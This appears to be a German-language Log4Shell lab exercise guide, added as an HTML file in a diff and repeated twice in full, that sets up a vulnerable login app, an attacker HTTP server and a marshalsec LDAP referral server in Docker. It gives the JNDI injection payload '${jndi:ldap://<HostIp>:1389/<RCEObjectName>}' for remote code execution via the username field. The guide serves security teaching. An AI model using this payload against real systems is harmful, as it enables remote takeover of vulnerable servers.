@@ -1,0 +1,254 @@
+<h1 id="log4shell-übungsanleitung">Log4Shell Übungsanleitung</h1>
+<h2 id="allgemeines-angriff">Allgemeines / Angriff</h2>
+<h3 id="log4j">Log4J</h3>
+<p>Log4J ist eine Java-Bibliothek, die Softwareentwicklern dabei hilft,
+Fehler und Prozesse in einer Software zu verfolgen. Es erfasst und
+speichert Fehlerberichte oder Zwischenergebnisse, die als “Logs”
+bezeichnet werden. Diese Logs können später eingesehen werden, um besser
+zu verstehen, wie die Software in bestimmten Situationen reagiert hat.
+Log4j läuft auf der freien Open Source Software der Apache Software
+Foundation und gilt als Vorreiter für Login-Frameworks und wird in den
+meisten Java basierten Programmen als Standard verwendet.</p>
+<h3 id="log4shell">Log4Shell</h3>
+<p>Die Schwachstelle in Log4j wird als Log4Shell oder CVE-2021-44228
+bezeichnet und wurde Ende 2021 bekannt gemacht. Sie basiert auf einer
+Injektionsschwachstelle in dem Java-Logging-Framework Log4j. Ein
+Angreifer könnte diese Schwachstelle nutzen und damit einzelne Programme
+ausführen oder gar das System vollständig übernehmen. Dadurch könnte zum
+Beispiel weitere Schadsoftware nachgeladen oder vertrauliche Daten aus
+dem System geschöpft werden.</p>
+<h3 id="komponenten">Komponenten</h3>
+<ul>
+<li><strong>vulnapp</strong></li>
+</ul>
+<p>Die Webanwendung vulnapp fungiert als Angriffsopfer und enthält zwei
+Eingabefelder: einen für den Benutzernamen und einen für das Passwort.
+Zum Loggen der Anmeldeversuche wird die anfällige log4j-Version 2.14.1
+genutzt.</p>
+<ul>
+<li><strong>httpserver</strong></li>
+</ul>
+<p>Der HTTP-server nimmt Anfragen von der Webanwendung entgegen und wird
+vom Angreifer kontrolliert. Er liefert beispielsweise Schadcode zurück
+und sorgt dafür, dass der Angreifer diesen Code beim Opfer einschleust.
+HTTP-Server hostet .class-Dateien, die für eine Remote-Code-Ausführung
+verwendet werden.</p>
+<ul>
+<li><strong>marshalsec</strong></li>
+</ul>
+<p>Ein LDAP-Server ist ein Verzeichnisdienst und fungiert im Prinzip wie
+ein Telefonbuch: er kann Einträge von Benutzern oder Konfigurationen,
+aber auch IP-Adressen von beispielsweise Datenbanken enthalten. Der
+LDAP-Referral-Server leitet bestimmte LDAP-Abfragen an den HTTP-Server
+weiter.</p>
+<h3 id="hilfreiche-unix-befehle">Hilfreiche Unix Befehle</h3>
+<ul>
+<li><strong>bash [Option] [Befehl]</strong>: Führt ein Befehl in der
+Bash Konsole aus
+<ul>
+<li>bash -c “&lt;-Befehl&gt;”</li>
+<li>bash ./<ausführbare_datei></li>
+</ul></li>
+<li><strong>ls [Option]</strong>: Steht für “list”, zeigt den Inhalt
+eines Verzeichnisses an
+<ul>
+<li>ls -l —&gt; zeigt weitere Informationen zum Inhalt an (z.B.
+Dateirechte)</li>
+<li>ls -la —&gt; zeigt auch versteckte Dateien (z.B. Dateien die mit
+einem “.” beginnen)</li>
+<li>ls -R —&gt; zeigt rekursiv auch den Inhalt von Unterordnern an</li>
+</ul></li>
+<li><strong>cd [Verzeichnis(-Pfad)]</strong>: Steht für “change
+directory”, z.dt. “Verzeichnis wechseln”
+<ul>
+<li>cd .. —&gt; wechselt bspw. in das übergeordnete Verzeichnis</li>
+</ul></li>
+<li><strong>cat [Datei(-Pfad)]</strong>: Kann dazu genutzt werden um den
+Inhalt einer Datei auszugeben</li>
+<li><strong>./<Datei></strong>: Führt die Datei aus</li>
+<li><strong>chmod [Option] [Ziel]:</strong> Verändert Zugriffsrechte für
+Verzeichnisse und Dateien
+<ul>
+<li>chmod +x [Ziel] —&gt; Fügt die Berechtigung zum Ausführen hinzu</li>
+</ul></li>
+<li><strong>wc [Option] [Datei]:</strong> Steht für “word count”, zählt
+Wörter, Zeichen und Bytes
+<ul>
+<li>wc -l [Datei] ****—&gt; zählt die Zeilen in der Datei</li>
+<li>wc -w [Datei] ****—&gt; zählt die Wörter in der Datei</li>
+</ul></li>
+<li><strong>rm</strong> <strong>[Option]</strong>
+<strong>[Datei/Verzeichnis]</strong>: Löscht eine Datei oder ein
+Verzeichnis
+<ul>
+<li>rm [Datei] —&gt; löscht eine Datei</li>
+<li>rm -rf [Verzeichnis] —&gt; löscht Verzeichnis rekursiv und ohne
+Nachfrage</li>
+</ul></li>
+</ul>
+<h2 id="aufbau-der-übung">Aufbau der Übung</h2>
+<h3 id="einführung">Einführung</h3>
+<p>In diesem Versuchen werden sie die verwundbare Webanwendung durch
+eine Injektionsschwachstelle angreifen und können so Schadcode auf der
+Web-Anwendung ausführen.</p>
+<h4 id="docker-network-erstellen">1. Docker Network erstellen</h4>
+<p>Beginnen Sie mit der Erstellung des Docker-Netzwerkes.</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> network create log4shell</span></code></pre></div>
+<h4 id="docker-images-erstellen">2. Docker Images erstellen</h4>
+<p>Nun müssen Sie die Images erstellen.</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker build <span class="at">-t</span> log4shell-vulnapp vulnapp</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker build <span class="at">-t</span> log4shell-httpserver httpserver</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker build <span class="at">-t</span> log4shell-marshalsec marshalsec</span></code></pre></div>
+<h4 id="docker-container-ausführen">3. Docker Container ausführen</h4>
+<p>Zuletzt müssen neue Docker Container aus Images erstellt und
+ausgeführt werden.</p>
+<p><strong>Wichtige Notiz:</strong> Bei der Nutzung von Windows
+PowerShell, müssen Sie <code>$(pwd)</code> durch <code>${pwd}</code>
+ersetzen.</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker run <span class="at">-d</span> <span class="at">--name</span> log4shell-vulnapp <span class="at">--network</span><span class="op">=</span><span class="st">&quot;log4shell&quot;</span> <span class="at">-p</span> 8080:8080 log4shell-vulnapp</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker run <span class="at">-d</span> <span class="at">--name</span> log4shell-httpserver <span class="at">--network</span><span class="op">=</span><span class="st">&quot;log4shell&quot;</span> <span class="at">-p</span> 3223:3223 <span class="at">-v</span> <span class="va">$(</span><span class="bu">pwd</span><span class="va">)</span>/httpserver:/httpserver log4shell-httpserver</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker run <span class="at">-d</span> <span class="at">--name</span> log4shell-marshalsec <span class="at">--network</span><span class="op">=</span><span class="st">&quot;log4shell&quot;</span> <span class="at">-p</span> 1389:1389 log4shell-marshalsec <span class="st">&quot;http://&lt;HostIp&gt;:&lt;Port&gt;/#&lt;RCEObjectName&gt;&quot;</span></span></code></pre></div>
+<h3 id="exploit">Exploit</h3>
+<p>Um den Angriff durchführen zu können, müssen Sie nun die verwundbare
+Web-Anwendung “localhost:8080” über einen Browser ihrer Wahl öffnen.
+Anschließend müssen Sie die Log des Containers der Web-Anwendung öffnen
+um das logging der Anmeldeversuche anzuschauen. Sie werden nach
+versuchten Anmeldungen auf der Webseite Informationen wie “Incorrect
+login attempt for username `test´” in der Log sehen können. Hier merken
+Sie, dass Sie Kontrolle über einen Teil der protokollierten Zeichenfolge
+(z.B. Username) haben.</p>
+<p>Sie können eine Payload wie folgt eintragen, um Schadcode remote auf
+der Web-Anwendung auszuführen:</p>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="va">${jndi</span><span class="op">:</span>ldap<span class="op">:</span>//&lt;HostIp&gt;<span class="op">:</span><span class="dv">1389</span>/&lt;RCEObjectName&gt;<span class="va">}</span></span></code></pre></div>
+<p><strong>Sie haben nun das Ende der Übung erreicht.</strong></p>
+<h1 id="log4shell-übungsanleitung-1">Log4Shell Übungsanleitung</h1>
+<h2 id="allgemeines-angriff-1">Allgemeines / Angriff</h2>
+<h3 id="log4j-1">Log4J</h3>
+<p>Log4J ist eine Java-Bibliothek, die Softwareentwicklern dabei hilft,
+Fehler und Prozesse in einer Software zu verfolgen. Es erfasst und
+speichert Fehlerberichte oder Zwischenergebnisse, die als “Logs”
+bezeichnet werden. Diese Logs können später eingesehen werden, um besser
+zu verstehen, wie die Software in bestimmten Situationen reagiert hat.
+Log4j läuft auf der freien Open Source Software der Apache Software
+Foundation und gilt als Vorreiter für Login-Frameworks und wird in den
+meisten Java basierten Programmen als Standard verwendet.</p>
+<h3 id="log4shell-1">Log4Shell</h3>
+<p>Die Schwachstelle in Log4j wird als Log4Shell oder CVE-2021-44228
+bezeichnet und wurde Ende 2021 bekannt gemacht. Sie basiert auf einer
+Injektionsschwachstelle in dem Java-Logging-Framework Log4j. Ein
+Angreifer könnte diese Schwachstelle nutzen und damit einzelne Programme
+ausführen oder gar das System vollständig übernehmen. Dadurch könnte zum
+Beispiel weitere Schadsoftware nachgeladen oder vertrauliche Daten aus
+dem System geschöpft werden.</p>
+<h3 id="komponenten-1">Komponenten</h3>
+<ul>
+<li><strong>vulnapp</strong></li>
+</ul>
+<p>Die Webanwendung vulnapp fungiert als Angriffsopfer und enthält zwei
+Eingabefelder: einen für den Benutzernamen und einen für das Passwort.
+Zum Loggen der Anmeldeversuche wird die anfällige log4j-Version 2.14.1
+genutzt.</p>
+<ul>
+<li><strong>httpserver</strong></li>
+</ul>
+<p>Der HTTP-server nimmt Anfragen von der Webanwendung entgegen und wird
+vom Angreifer kontrolliert. Er liefert beispielsweise Schadcode zurück
+und sorgt dafür, dass der Angreifer diesen Code beim Opfer einschleust.
+HTTP-Server hostet .class-Dateien, die für eine Remote-Code-Ausführung
+verwendet werden.</p>
+<ul>
+<li><strong>marshalsec</strong></li>
+</ul>
+<p>Ein LDAP-Server ist ein Verzeichnisdienst und fungiert im Prinzip wie
+ein Telefonbuch: er kann Einträge von Benutzern oder Konfigurationen,
+aber auch IP-Adressen von beispielsweise Datenbanken enthalten. Der
+LDAP-Referral-Server leitet bestimmte LDAP-Abfragen an den HTTP-Server
+weiter.</p>
+<h3 id="hilfreiche-unix-befehle-1">Hilfreiche Unix Befehle</h3>
+<ul>
+<li><strong>bash [Option] [Befehl]</strong>: Führt ein Befehl in der
+Bash Konsole aus
+<ul>
+<li>bash -c “&lt;-Befehl&gt;”</li>
+<li>bash ./<ausführbare_datei></li>
+</ul></li>
+<li><strong>ls [Option]</strong>: Steht für “list”, zeigt den Inhalt
+eines Verzeichnisses an
+<ul>
+<li>ls -l —&gt; zeigt weitere Informationen zum Inhalt an (z.B.
+Dateirechte)</li>
+<li>ls -la —&gt; zeigt auch versteckte Dateien (z.B. Dateien die mit
+einem “.” beginnen)</li>
+<li>ls -R —&gt; zeigt rekursiv auch den Inhalt von Unterordnern an</li>
+</ul></li>
+<li><strong>cd [Verzeichnis(-Pfad)]</strong>: Steht für “change
+directory”, z.dt. “Verzeichnis wechseln”
+<ul>
+<li>cd .. —&gt; wechselt bspw. in das übergeordnete Verzeichnis</li>
+</ul></li>
+<li><strong>cat [Datei(-Pfad)]</strong>: Kann dazu genutzt werden um den
+Inhalt einer Datei auszugeben</li>
+<li><strong>./<Datei></strong>: Führt die Datei aus</li>
+<li><strong>chmod [Option] [Ziel]:</strong> Verändert Zugriffsrechte für
+Verzeichnisse und Dateien
+<ul>
+<li>chmod +x [Ziel] —&gt; Fügt die Berechtigung zum Ausführen hinzu</li>
+</ul></li>
+<li><strong>wc [Option] [Datei]:</strong> Steht für “word count”, zählt
+Wörter, Zeichen und Bytes
+<ul>
+<li>wc -l [Datei] ****—&gt; zählt die Zeilen in der Datei</li>
+<li>wc -w [Datei] ****—&gt; zählt die Wörter in der Datei</li>
+</ul></li>
+<li><strong>rm</strong> <strong>[Option]</strong>
+<strong>[Datei/Verzeichnis]</strong>: Löscht eine Datei oder ein
+Verzeichnis
+<ul>
+<li>rm [Datei] —&gt; löscht eine Datei</li>
+<li>rm -rf [Verzeichnis] —&gt; löscht Verzeichnis rekursiv und ohne
+Nachfrage</li>
+</ul></li>
+</ul>
+<h2 id="aufbau-der-übung-1">Aufbau der Übung</h2>
+<h3 id="einführung-1">Einführung</h3>
+<p>In diesem Versuchen werden sie die verwundbare Webanwendung durch
+eine Injektionsschwachstelle angreifen und können so Schadcode auf der
+Web-Anwendung ausführen.</p>
+<h4 id="docker-network-erstellen-1">1. Docker Network erstellen</h4>
+<p>Beginnen Sie mit der Erstellung des Docker-Netzwerkes.</p>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> network create log4shell</span></code></pre></div>
+<h4 id="docker-images-erstellen-1">2. Docker Images erstellen</h4>
+<p>Nun müssen Sie die Images erstellen.</p>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker build <span class="at">-t</span> log4shell-vulnapp vulnapp</span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker build <span class="at">-t</span> log4shell-httpserver httpserver</span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker build <span class="at">-t</span> log4shell-marshalsec marshalsec</span></code></pre></div>
+<h4 id="docker-container-ausführen-1">3. Docker Container ausführen</h4>
+<p>Zuletzt müssen neue Docker Container aus Images erstellt und
+ausgeführt werden.</p>
+<p><strong>Wichtige Notiz:</strong> Bei der Nutzung von Windows
+PowerShell, müssen Sie <code>$(pwd)</code> durch <code>${pwd}</code>
+ersetzen.</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker run <span class="at">-d</span> <span class="at">--name</span> log4shell-vulnapp <span class="at">--network</span><span class="op">=</span><span class="st">&quot;log4shell&quot;</span> <span class="at">-p</span> 8080:8080 log4shell-vulnapp</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker run <span class="at">-d</span> <span class="at">--name</span> log4shell-httpserver <span class="at">--network</span><span class="op">=</span><span class="st">&quot;log4shell&quot;</span> <span class="at">-p</span> 3223:3223 <span class="at">-v</span> <span class="va">$(</span><span class="bu">pwd</span><span class="va">)</span>/httpserver:/httpserver log4shell-httpserver</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker run <span class="at">-d</span> <span class="at">--name</span> log4shell-marshalsec <span class="at">--network</span><span class="op">=</span><span class="st">&quot;log4shell&quot;</span> <span class="at">-p</span> 1389:1389 log4shell-marshalsec <span class="st">&quot;http://&lt;HostIp&gt;:&lt;Port&gt;/#&lt;RCEObjectName&gt;&quot;</span></span></code></pre></div>
+<h3 id="exploit-1">Exploit</h3>
+<p>Um den Angriff durchführen zu können, müssen Sie nun die verwundbare
+Web-Anwendung “localhost:8080” über einen Browser ihrer Wahl öffnen.
+Anschließend müssen Sie die Log des Containers der Web-Anwendung öffnen
+um das logging der Anmeldeversuche anzuschauen. Sie werden nach
+versuchten Anmeldungen auf der Webseite Informationen wie “Incorrect
+login attempt for username `test´” in der Log sehen können. Hier merken
+Sie, dass Sie Kontrolle über einen Teil der protokollierten Zeichenfolge
+(z.B. Username) haben.</p>
+<p>Sie können eine Payload wie folgt eintragen, um Schadcode remote auf
+der Web-Anwendung auszuführen:</p>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="va">${jndi</span><span class="op">:</span>ldap<span class="op">:</span>//&lt;HostIp&gt;<span class="op">:</span><span class="dv">1389</span>/&lt;RCEObjectName&gt;<span class="va">}</span></span></code></pre></div>
+<p><strong>Sie haben nun das Ende der Übung erreicht.</strong></p>
